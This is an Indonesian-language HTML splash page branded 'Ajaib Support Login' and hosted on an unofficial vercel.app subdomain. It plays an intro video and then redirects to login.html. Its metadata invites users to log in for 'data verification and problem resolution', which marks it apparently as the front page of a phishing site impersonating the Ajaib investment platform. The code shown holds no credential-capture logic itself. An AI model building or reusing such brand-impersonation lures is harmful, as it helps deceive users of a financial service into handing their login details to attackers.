<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <!-- Open Graph Meta Tags -->
<meta property="og:image" content="https://floq-login.vercel.app/logoajaib.jpg" />
<meta property="og:title" content="Ajaib Support Login" />
<meta property="og:description" content="Lakukan Login ke Web AJAIB untuk proses verifikasi data dan penyelesaian kendala." />
<meta property="og:url" content="https://floq-login.vercel.app" />
<meta property="og:type" content="website" />

<title>Ajaib </title>

<style>
    html, body {
        margin: 0;
        padding: 0;
        width: 100%;
        height: 100%;
        background: #000;
        overflow: hidden;
    }

    #blackCover {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #000;
        z-index: 9999;
        opacity: 1;
        transition: opacity 0.4s ease;
    }

    /* Fade putih lebih lambat (1.6s) */
    #whiteCover {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: #fff;
        z-index: 9998;
        opacity: 0;
        transition: opacity 1.6s ease;
        pointer-events: none;
    }

    video {
        width: 100%;
        height: 100%;
        object-fit: cover;
        position: fixed;
        top: 0;
        left: 0;
    }

    video::-webkit-media-controls { display:none !important; }
    video::-webkit-media-controls-start-playback-button { display:none !important; opacity:0 !important; }
</style>
</head>
<body>

<div id="blackCover"></div>
<div id="whiteCover"></div>

<video id="introVideo" autoplay muted playsinline preload="auto">
    <source src="vidio.mp4" type="video/mp4">
</video>

<script>
    const vid = document.getElementById("introVideo");
    const black = document.getElementById("blackCover");
    const white = document.getElementById("whiteCover");

    function startVideo() {
        vid.muted = true;
        vid.play().then(() => {
            setTimeout(() => {
                black.style.opacity = "0";
            }, 150);
        }).catch(() => {
            setTimeout(startVideo, 100);
        });
    }
    window.onload = startVideo;

    vid.onended = () => {
        white.style.opacity = "1";  // fade putih mulai (1.6s)

        setTimeout(() => {
            window.location.href = "login.html";
        }, 1000); // pindah halaman setelah fade selesai
    };
</script>

</body>
</html>
